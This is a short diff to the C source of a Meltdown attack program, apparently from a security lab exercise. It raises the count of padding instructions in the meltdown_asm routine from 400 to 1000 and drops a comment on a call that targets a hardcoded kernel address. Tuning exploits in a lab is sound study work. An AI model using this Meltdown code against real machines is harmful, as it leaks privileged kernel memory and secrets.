@@ -59,7 +59,7 @@ void meltdown_asm(unsigned long kernel_data_addr)
    
    // Give eax register something to do
    asm volatile(
-       ".rept 400;"                
+       ".rept 1000;"
        "add $0x141, %%eax;"
        ".endr;"                    
     
@@ -99,7 +99,7 @@ int main()
       }
       int ret = pread(fd, NULL, 0, 0); // Cause the secret data to be cached.
 
-      meltdown_asm(0xf9c91000); // Mod 1
+      meltdown_asm(0xf9c91000);
   }
   else {
       printf("Memory access violation!\n");
